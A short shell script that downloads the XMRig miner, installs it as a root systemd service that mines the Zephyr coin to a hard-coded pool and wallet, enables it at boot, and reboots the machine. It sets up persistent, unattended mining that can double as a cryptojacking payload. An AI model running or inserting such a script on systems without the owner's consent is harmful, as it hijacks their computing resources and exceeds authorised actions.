cd /usr/local/bin
mwker=$(TZ='Asia/Ho_Chi_Minh' date +'%d-%m_%H')
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
sudo tar xvzf xmrig-6.16.2-linux-static-x64.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.16.2/xmrig -o us.zephyr.herominers.com:1123 -u ZEPHYR2TAeqLmKxmFuajteVeQwubM8Fm9PLVmHqREGVqDtfth7Y4ZHQVzVAd5ZKgNkJqBaVxFvVnGJnsYXEPev77SFG1Zn1z9EF4u -p "cpu3" --coin zephyr -a rx/0 \n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmrig.service'
sudo systemctl daemon-reload
sudo systemctl enable xmrig.service
sudo reboot &
